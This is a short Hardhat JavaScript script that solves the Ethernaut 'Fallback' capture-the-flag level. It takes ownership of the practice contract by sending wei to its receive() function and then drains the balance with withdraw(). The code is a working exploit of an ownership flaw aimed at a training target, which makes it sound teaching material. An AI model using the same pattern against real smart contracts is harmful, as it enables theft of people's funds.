const { ethers, waffle } = require("hardhat");
const Runner = require('./lib/runner')

Runner.run(async () => {
    const [owner] = await ethers.getSigners();
    
    //PLACE FALLBACK CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const fallbackAddr = "0x5b50DFD5AE5af42E7F010f84e055Eb0AA10a27a9";
    
    const fallback = await ethers.getContractAt("Fallback", fallbackAddr);
    
    
    //verify original owner 
    console.log('* * * ');
    console.log(`owner is ${await fallback.owner()}`);
    
    //contribute 1 so that our contribution is recorded (is > 0 as per requirement) 
    await fallback.contribute({value:1});
    
    //now pay 1 more into receive() function which has a different criteria for ownership 
	await owner.sendTransaction({
		to: fallback.address,
		value: 1,
	}); 
    
    //now verify that we are owner, for the cost of only 2 wei :)
    console.log(`owner is ${await fallback.owner()}`);
    
    //drain the balance 
    await fallback.withdraw(); 
    
    //verify the balance 
    console.log(`contract balance is ${await waffle.provider.getBalance(fallbackAddr)}`);
    console.log('* * * ');
});
